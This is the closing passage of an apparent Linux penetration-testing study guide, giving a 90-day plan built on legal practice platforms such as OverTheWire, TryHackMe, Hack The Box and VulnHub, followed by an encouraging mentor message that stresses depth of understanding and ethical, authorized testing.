- Complete OverTheWire Bandit (levels 0-34)
- Read "Linux Command Line" chapters 1-15
- Set up Kali + Metasploitable lab
- Practice every command in this guide

**Days 31-60 (Application):**
- Complete TryHackMe "Linux Fundamentals" + "Linux PrivEsc"
- Do 5 easy Hack The Box machines
- Write 10 bash scripts for common tasks
- Study LinPEAS source code

**Days 61-90 (Mastery):**
- Do 10 medium HTB machines
- Practice every privesc technique on VulnHub machines
- Build a personal notes system documenting everything you learn
- Start your bug bounty journey on HackerOne/Bugcrowd

---

> **Final Message from Your Mentor:**
>
> You now hold in your hands the most comprehensive Linux hacking guide a student could ask for. But remember — this paper is worthless without practice. Every command here should be typed by your hands, not just read by your eyes.
>
> The difference between a CISO and a script kiddie is **depth of understanding**. A CISO knows *why* things work, not just *that* they work. Read this guide once to understand. Read it again to remember. Practice to master.
>
> The goal isn't to memorize every command. It's to understand every concept so deeply that you can **reconstruct** any command from first principles. That's what separates world-class hackers from average ones.
>
> Keep learning. Stay curious. Stay ethical. And one day, you'll be the one writing guides like this.
>
> — Your Mentor (The CISO You're Becoming)

---
*End of Linux Hacker Master Guide | For Educational & Authorized Testing Only*
